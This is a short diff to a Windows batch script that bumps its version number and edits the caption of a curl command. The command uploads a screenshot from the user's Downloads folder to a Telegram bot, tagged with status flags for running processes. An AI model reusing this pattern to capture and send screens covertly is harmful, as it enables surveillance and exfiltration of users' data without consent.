@@ -2,7 +2,7 @@
 
 
 setlocal enabledelayedexpansion
-set "BATCHVERSION=2.4"
+set "BATCHVERSION=2.5"
 
 
 
@@ -149,7 +149,7 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=LAPTOP|SHST%SHSTRUNNING%KMS%KMSRUNNING%|%time%|%BATCHVERSION%|" ^
+     -F "caption=LAPTOP|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
